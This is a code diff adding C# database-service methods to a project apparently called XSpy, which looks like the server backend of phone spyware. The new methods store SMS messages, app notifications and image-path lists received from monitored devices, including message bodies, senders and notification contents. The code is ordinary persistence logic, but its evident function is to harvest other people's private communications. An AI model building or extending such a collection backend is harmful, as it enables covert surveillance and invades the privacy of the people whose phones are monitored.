@@ -14,6 +14,7 @@ using XSpy.Database.Entities.Devices;
 using XSpy.Database.Extensions;
 using XSpy.Database.Models.Tables;
 using XSpy.Database.Services.Base;
+using XSpy.Shared;
 using XSpy.Shared.Models.Requests.Devices;
 using XSpy.Shared.Models.Requests.Devices.Search;
 using File = XSpy.Database.Entities.Devices.File;
@@ -206,7 +207,71 @@ namespace XSpy.Database.Services
             
             await DbContext.SaveChangesAsync();
         }
+        public async Task ImageList(string deviceId, List<string> paths)
+        {
+            var device =
+                await DbContext.Devices.Where(s => s.DeviceId == deviceId)
+                    .FirstOrDefaultAsync();
+            if (device.Id == Guid.Empty)
+                return;
 
+            device.IsLoadingDir = false;
+            DbContext.Update(device);
+            
+            DbContext.ImageList.RemoveRange(DbContext.ImageList.Where(s => s.DeviceId == device.Id));
+            foreach (var pathData in paths)
+            {
+                var data = new FileList()
+                {
+                    Id = Guid.NewGuid(),
+                    CratedAt = DateTime.Now,
+                    DeviceId = device.Id,
+                    OriginalPath = pathData
+                };
+
+                await DbContext.AddAsync(data);
+            }
+            
+            await DbContext.SaveChangesAsync();
+        }
+
+        public async Task StoreMessages(string deviceId, List<ListSmsData> listSms)
+        {
+            var device =
+                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
+                    .FirstOrDefaultAsync();
+            if (device == Guid.Empty)
+                return;
+
+            foreach (var smsData in listSms)
+            {
+                var date = JavaTimeStampToDateTime(smsData.Date);
+                var hash = CalculateMd5(
+                    smsData.Address + date + smsData.Type);
+
+                if (await DbContext.Messages.AnyAsync(s => s.Hash == hash))
+                {
+                    continue;
+                }
+
+                var smsEntry = new Sms()
+                {
+                    Id = Guid.NewGuid(),
+                    DeviceId = device,
+                    Address = smsData.Address,
+                    CratedAt = DateTime.Now,
+                    Body = smsData.Body,
+                    Hash = hash,
+                    Date = date,
+                    IsRead = smsData.Read == "true" || smsData.Read == "1",
+                    Type = (CallType) smsData.Type
+                };
+                await DbContext.Messages.AddAsync(smsEntry);
+            }
+
+            await DbContext.SaveChangesAsync();
+        }
+        
         public async Task<File> StoreFile(string deviceId, string savePath, TransferFileRequest transferFile)
         {
             var device =
@@ -271,6 +336,32 @@ namespace XSpy.Database.Services
                     PhoneId = dataRequest.PhoneId
                 });
             }
+
+
+            await DbContext.SaveChangesAsync();
+        }
+
+        public async Task SaveNotification(string deviceId, SaveNotificationsData dataRequest)
+        {
+            var device =
+                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
+                    .FirstOrDefaultAsync();
+
+            if (device == Guid.Empty)
+                return;
+            
+                await DbContext.Notifications.AddAsync(new Notification()
+                {
+                    Id = Guid.NewGuid(),
+                    CratedAt = DateTime.Now,
+                    DeviceId = device,
+                    Content = dataRequest.Content,
+                    Date = JavaTimeStampToDateTime(dataRequest.PostTime),
+                    Key = dataRequest.Key,
+                    AppName = dataRequest.AppName,
+                    Title = dataRequest.Title
+                });
+            
 
 
             await DbContext.SaveChangesAsync();
